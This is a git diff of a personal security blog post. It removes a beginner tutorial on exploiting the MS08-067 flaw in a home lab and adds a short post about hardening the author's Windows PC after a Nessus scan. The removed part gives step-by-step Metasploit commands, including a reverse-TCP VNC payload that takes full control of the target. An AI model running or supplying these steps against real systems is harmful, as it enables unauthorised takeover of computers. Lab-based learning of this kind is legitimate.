@@ -1,113 +1,19 @@
 ---
 layout: post
-title:  "First Hack Part 3 (Exploiting The Vulnerability)"
-date:   2018-04-16 14:56:03 -0400
+title:  "Hunting for mDNS Vulnerabilities"
+date:   2018-04-18 14:56:03 -0400
 categories: jekyll update
 ---
 
-<br>[Part 1 (Installing The Virtual Network)][part-1]
-<br>[Part 2 (Searching for Targets and their Weaknesses)][part-2]
+I decided to run Nessus on my Windows 10 PC. This is my fastest PC. It is also my most valuable, so I want to ensure that the security is air tight (without going to extream measures). I loaded up Nessus in order to anylize the machine and the software identified 2 medium level vulnurabilities.
 
-Legal Disclosure: Don't do this on networks other than your own without written consent from the network administrator. Otherwise, you would be committing an illegal act.
+[SMB Signing Disabled][SMB-Signing] https://www.tenable.com/plugins/nessus/57608
+[mDNS Detection (Remote Network)][mDNS-Detection] https://www.tenable.com/plugins/nessus/12218
 
-Now that we have successfully obtained a list of all the vulnerabilities, we are going to use one of the bigger ones. You could use more than one of the critical vulnerabilities in Nessus but we are going to use MS08_067
+I followed the instructions in Nessus' SMB Signing article and blocked UDP port 5353 in Windows firewall, ran the scan again and... the mDNS article did not vanish as expected. I went into Window's local group policy editor and ran the scan again. No difference. I started looking into what mDNS actually was. According to [RFC-6762][RFC-6762], mDNS (Multicast DNS) basicly makes it easier for devices to communicate over a network without the end user having to get too involved in the process. It's the reason why your iTunes can talk to other computer's iTunes so seamlessly. Although I own an iPhone, I don't really get too involved in the "Apple process," so I figured why not disable it. Thankfully iTunes itself uses something called Bonjour in order to utilize mDNS. Thankfully I can just disable it on startup.
 
-<b>Finding The Commands To Hack Windows XP
 
-Once we have the codes, we need to look them up in the "Rapid 7" database. Rapid 7 is a company that develops a cool called Metasploit, which is the tool we use to actually hack another computer. We are going to use a tool called a VNC (Virtual Network Computing). This is a window that contains the remote operating system. It allows mouse and keyboard controls, much like the virtual machine you are using now.
 
-First, go to the [Rapid7 Vulnerabilities & Exploit Database][Rapid7-DB]
-
-Type in the vulnerability code we want to use. In our particular case, it is MS08_067
-
-In the drop-down menu to the right of the search field, choose "Metasploit Modules"
-
-Look under "Module Name" and identify the code exploit/windows/smb/ms08_067_netapi. We will use this later
-
-<b>Loading Exploits and Payloads</b>
-<br>[Offensive Security - Metasploit Commands][Metasploit-Commands]
-<br>[Offensive Security - Using Exploits][Using-Exploits]
-
-Open terminal and type in the following command
-
-{% highlight ruby %}
-msfconsole
-{% endhighlight %}
-
-Wait for it to load then type in the following
-
-{% highlight ruby %}
-use exploit/windows/smb/ms08_067_netapi
-{% endhighlight %}
-
-Next we will need to use a payload. A payload is basic software that takes advantage of the exploit. So type
-
-{% highlight ruby %}
-set PAYLOAD windows/vncinject/reverse_tcp
-{% endhighlight %}
-
-<b>Setting Up The Attack
-
-You will need to load a list of settings before running the command to hack the Windows XP computer. We can do this by typing
-
-{% highlight ruby %}
-show options
-#you can use show options for any exploit/payload you end up choosing in the future.
-{% endhighlight %}
-
-You should get something like the image below
-
-![image tooltip](/blog/images/ms08_067/msfconsole_show_options1.JPG)
-
-You may notice that a few of the fields are empty. RHOST and LHOST. RHOST is the remote host. The IP of the target computer. LHOST is the local host. Your computer.
-
-You may not know your own IP. So open a new terminal tab with Ctrl+Shift+T and type
-
-{% highlight ruby %}
-ifconfig
-{% endhighlight %}
-
-You should see something like this. I highlighted the IP in yellow.
-
-![image tooltip](/blog/images/ms08_067/ifconfig.JPG)
-
-Type in the following, but replace the RHOST IP with the Windows IP you found earlier and LHOST of the Kali IP.
-
-{% highlight ruby %}
-set RHOST 192.168.1.244
-{% endhighlight %}
-
-{% highlight ruby %}
-set LHOST 192.168.1.48
-{% endhighlight %}
-
-We have everything we need right? Just one more setting. This will allow us to control the computer rather than simply spy on it.
-
-{% highlight ruby %}
-set ViewOnly false
-{% endhighlight %}
-
-<b>Hack It!
-
-Now run show options again and you should have something like this.
-
-![image tooltip](/blog/images/ms08_067/msfconsole_show_options2.JPG)
-
-Run the following command.
-
-{% highlight ruby %}
-exploit
-{% endhighlight %}
-
-Congratulations. You did it! You can now do whatever you like to the target computer.
-
-![image tooltip](/blog/images/ms08_067/owned.JPG)
-
-<br>[Homepage][homepage]
-
-[part-1]: MS08_067_Part_1.html
-[part-2]: MS08_067_Part_2.html
-[homepage]: https://danielloosec.github.io/blog/
-[Rapid7-DB]: https://www.rapid7.com/db
-[Using-Exploits]: https://www.offensive-security.com/metasploit-unleashed/exploits/
-[Metasploit-Commands]: https://www.offensive-security.com/metasploit-unleashed/msfconsole-commands/
+[SMB-Signing]: https://www.tenable.com/plugins/nessus/57608
+[mDNS-Detection]: https://www.tenable.com/plugins/nessus/12218
+[RFC-6762]: https://tools.ietf.org/html/rfc6762
